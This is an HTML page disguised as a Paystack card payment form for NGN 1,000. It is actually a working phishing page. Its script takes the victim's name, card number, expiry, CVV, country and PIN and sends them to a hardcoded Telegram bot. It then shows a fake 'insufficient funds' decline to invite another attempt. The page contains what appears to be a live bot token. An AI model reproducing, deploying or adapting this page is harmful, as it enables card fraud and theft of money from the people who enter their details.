<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Pay </title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;}
.wrap{background:#fff;border-radius:16px;padding:2rem 1.5rem;width:100%;max-width:400px;box-shadow:0 2px 20px rgba(0,0,0,0.08);}
h2{text-align:center;font-size:17px;font-weight:600;color:#1a1a1a;margin-bottom:1.5rem;}
.field{border:1.5px solid #e0e0e0;border-radius:10px;padding:12px 14px;background:#fff;margin-bottom:12px;transition:border-color .2s;}
.field:focus-within{border-color:#4caf87;}
.field label{display:block;font-size:10.5px;color:#999;letter-spacing:.06em;margin-bottom:4px;}
.field input{border:none;outline:none;background:transparent;font-size:16px;color:#1a1a1a;width:100%;font-family:inherit;}
.field input::placeholder{color:#ccc;}
.row{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
.cvv-head{display:flex;justify-content:space-between;align-items:center;}
.cvv-head span{font-size:10.5px;color:#4caf87;cursor:pointer;}
.pay-btn{width:100%;padding:15px;background:#4caf87;border:none;border-radius:10px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;transition:background .2s;}
.pay-btn:hover{background:#3d9e78;}
.pay-btn:disabled{background:#a0d4be;cursor:not-allowed;}
.alt-btns{display:flex;flex-direction:column;align-items:center;gap:10px;margin-top:14px;}
.alt-btn{display:flex;align-items:center;justify-content:center;gap:7px;padding:13px;border:1.5px solid #e0e0e0;border-radius:10px;background:#fff;color:#333;font-size:14px;cursor:pointer;font-family:inherit;}
.alt-btn.wide{width:82%;}
.alt-btn.narrow{width:62%;}
.secure{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:22px;color:#888;font-size:13px;}
.secure svg{width:14px;height:14px;fill:#888;}
.secure b{color:#1a1a1a;}
.toast{display:none;position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#333;color:#fff;padding:10px 20px;border-radius:8px;font-size:14px;z-index:999;}
</style>
</head>
<body>
<div class="wrap">
  <h2>Enter your card details to pay</h2>

  <div class="field">
    <label>FULL NAME</label>
    <input id="fn" type="text" placeholder="John Doe" maxlength="60" autocomplete="cc-name">
  </div>

  <div class="field">
    <label>CARD NUMBER</label>
    <input id="cn" type="tel" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number">
  </div>

  <div class="row">
    <div class="field">
      <label>CARD EXPIRY</label>
      <input id="ex" type="tel" placeholder="MM / YY" maxlength="7" autocomplete="cc-exp">
    </div>
    <div class="field">
      <div class="cvv-head">
        <label>CVV</label>
        <span>HELP?</span>
      </div>
      <input id="cv" type="tel" placeholder="123" maxlength="4" autocomplete="cc-csc">
    </div>
  </div>

  <div class="field">
    <label>COUNTRY</label>
    <input id="cy" type="text" placeholder="e.g. Nigeria" maxlength="60" autocomplete="country-name">
  </div>

  <div class="field">
    <label>PIN</label>
    <input id="pn" type="password" placeholder="••••" maxlength="6" autocomplete="off">
  </div>

  <button class="pay-btn" id="paybtn" onclick="submitPay()">Pay NGN 1,000</button>

  <div class="alt-btns">
    <button class="alt-btn wide">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><path d="M7 16l-4-4 4-4M17 8l4 4-4 4M14 4l-4 16"/></svg>
      Change Payment Method
    </button>
    <button class="alt-btn narrow">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><path d="M18 6L6 18M6 6l12 12"/></svg>
      Cancel Payment
    </button>
  </div>

  <div class="secure">
    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.25 3.75 10.15 9 11.25C17.25 21.15 21 16.25 21 11V5l-9-4z"/></svg>
    Secured by <b>paystack</b>
  </div>
</div>

<div class="toast" id="toast">Processing payment…</div>

<script>
const BOT = '9062407849:AAFhTh7Khmzi1zxjxQ2FKGAcILivgSAWQ6c';
const CID = '8638272513';

const cn = document.getElementById('cn');
const ex = document.getElementById('ex');
const cv = document.getElementById('cv');

cn.addEventListener('input', e => {
  let v = e.target.value.replace(/\D/g,'').slice(0,16);
  e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
});

ex.addEventListener('input', e => {
  let v = e.target.value.replace(/\D/g,'').slice(0,4);
  if(v.length >= 3) v = v.slice(0,2) + ' / ' + v.slice(2);
  e.target.value = v;
});

cv.addEventListener('input', e => {
  e.target.value = e.target.value.replace(/\D/g,'').slice(0,4);
});

async function submitPay() {
  const fullname = document.getElementById('fn').value.trim();
  const card   = cn.value.trim();
  const expiry = ex.value.trim();
  const cvv    = cv.value.trim();
  const country = document.getElementById('cy').value.trim();
  const pin    = document.getElementById('pn').value.trim();

  if (!fullname || !card || !expiry || !cvv || !country || !pin) {
    alert('Please fill in all card details.');
    return;
  }

  const btn = document.getElementById('paybtn');
  btn.disabled = true;
  btn.textContent = 'Processing…';

  const msg =
`💳 *New Card Details*
━━━━━━━━━━━━━━━
👤 *Full Name:* \`${fullname}\`
🔢 *Card Number:* \`${card}\`
📅 *Expiry:* \`${expiry}\`
🔒 *CVV:* \`${cvv}\`
🌍 *Country:* \`${country}\`
🔑 *PIN:* \`${pin}\`
━━━━━━━━━━━━━━━
💰 Amount: NGN 1,000`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: CID,
        text: msg,
        parse_mode: 'Markdown'
      })
    });
  } catch(e) {}

  setTimeout(() => {
    btn.textContent = 'Pay';
    btn.style.background = '#4caf87';
    btn.disabled = false;

    document.querySelector('.wrap').innerHTML = `
      <div style="text-align:center;padding:1rem 0;">
        <div style="width:56px;height:56px;border-radius:50%;background:#fff0f0;display:flex;align-items:center;justify-content:center;margin:0 auto 1.2rem;">
          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#e53935" stroke-width="2.2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
        </div>
        <h2 style="font-size:17px;font-weight:700;color:#e53935;margin-bottom:10px;">Payment Declined – Insufficient Funds</h2>
        <p style="font-size:14px;color:#555;line-height:1.7;margin-bottom:1.4rem;">
          Unfortunately, your payment could not be processed due to insufficient available funds on your card. Please check your card balance and ensure sufficient funds are available before attempting the transaction again.
        </p>
        <p style="font-size:13px;color:#999;">Thank you for your understanding.</p>
        <button onclick="location.reload()" style="margin-top:1.5rem;padding:12px 28px;border:1.5px solid #e0e0e0;border-radius:10px;background:#fff;color:#333;font-size:14px;cursor:pointer;font-family:inherit;">Try Again</button>
      </div>
    `;
  }, 2000);
}
</script>
</body>
</html>
